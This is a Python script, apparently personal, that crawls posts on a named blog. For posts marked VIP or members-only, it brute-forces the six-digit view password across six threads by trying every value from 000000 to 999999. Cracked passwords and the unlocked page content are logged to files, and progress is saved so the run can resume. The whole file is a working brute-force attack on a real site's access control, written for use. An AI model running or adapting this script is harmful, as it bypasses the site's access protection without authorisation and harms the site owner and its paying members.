# pyinstaller -F D:\aRooba\documents\code\网络脚本\kongBlog\kongBlog.py --icon ..\icon.ico

import encodings.idna
global pageNum
global startFrom
# global proxy_list
pageNum = [0, 0, 0, 0, 0, 0]
startFrom = [0, 0, 0, 0, 0, 0]
# proxy_list = []


def getPassword():
    import requests
    import random
    import traceback
    global pageNum
    global startFrom
    # global proxy_list
    print(threading.current_thread().getName())
    i = int(threading.current_thread().getName()[-1]) - 1
    while True:
        url = 'http://guga.angmiweb.net.cn/post/' + str(pageNum[i]) + '.html'
        # proxy = {'http': 'http://218.14.115.211:3128'}
        print('正在安排' + url)
        try:
            res = requests.get(url) # get，看该网页是不是vip
            res.raise_for_status()
            titleLine = res.text.split('\n')[6]
        except:
            print(str(pageNum[i]) + '\t404')
            print(traceback.format_exc())
            pageNum[i] += 6
            if pageNum[i] > 600:
                print(threading.current_thread().getName() + '已结束')
            continue
        print(titleLine.replace('<title>', '').replace('</title>', ''))
        if 'VIP' in titleLine or '会员' in titleLine:
            print('is VIP')
            found = False
            while startFrom[i] < 1000000:  # 穷举六位数字密码
                password = str(startFrom[i]).rjust(6, '0')
                data = {'password': password, 'submit': '查看'}
                try:
                    res = requests.post(url, data=data)
                    res.raise_for_status()
                    if res.text.startswith('<!') and '欢迎登录北邮校园网络' not in res.text:
                        with open('review.txt', 'a') as f:
                            f.write('\n\n\n\n' + password + '\n' + res.text)
                        print(threading.current_thread().getName() + '——' + str(startFrom[i]) + ': RIGHT!!!!!!!!!!!!!!!!!')
                        print(str(pageNum[i]) + '\tOK')
                        found = True
                        break
                    else:
                        print(threading.current_thread().getName() + '——' + str(startFrom[i]) + ': Wrong')
                except:
                    print(traceback.format_exc())
                    print(threading.current_thread().getName() + '——' + str(startFrom[i]) + '\t有误，URL为' + url)
                    startFrom[i] -= 1
                startFrom[i] += 1
            with open('password.txt', 'a') as f:
                if not found:
                    f.write(url + '\t找不到密码\n')
                else:
                    f.write(url + '\t' + password + '\n')
            startFrom[i] = 0
        else:
            print('is not VIP')

        pageNum[i] += 6
        if pageNum[i] > 600:
            print(threading.current_thread().getName() + '已结束')
            break


if __name__ == '__main__':
    with open('D:\\aRooba\\documents\\code\\网络脚本\\kongBlog\\kongBlog_record.txt', 'r') as f:
        for i, line in zip(range(6), f.readlines()):
            pageNum[i] = int(line.split(':')[0])
            startFrom[i] = int(line.split(':')[1])
    with open('D:\\aRooba\\documents\\code\\网络脚本\\kongBlog\\kongBlog_record_backup.txt', 'w') as f:
        for p, s in zip(pageNum, startFrom):
            f.write(str(p) + ':' + str(s) + '\n')
    # with open('D:\\aRooba\\documents\\code\\网络脚本\\collection_ip.txt', 'r') as f:
    #     for line in f.readlines():
    #         proxy_list.append({'http://' + line.split(':')[0] : line.split(':')[0][:-1]})
    import threading
    a = threading.Thread(target=getPassword, name='Thread-1')
    b = threading.Thread(target=getPassword, name='Thread-2')
    c = threading.Thread(target=getPassword, name='Thread-3')
    d = threading.Thread(target=getPassword, name='Thread-4')
    e = threading.Thread(target=getPassword, name='Thread-5')
    f = threading.Thread(target=getPassword, name='Thread-6')
    a.start()
    b.start()
    c.start()
    d.start()
    e.start()
    f.start()
    import time
    while True:
        time.sleep(60)
        with open('D:\\aRooba\\documents\\code\\网络脚本\\kongBlog\\kongBlog_record.txt', 'w') as f:
            for p, s in zip(pageNum, startFrom):
                f.write(str(p) + ':' + str(s) + '\n')
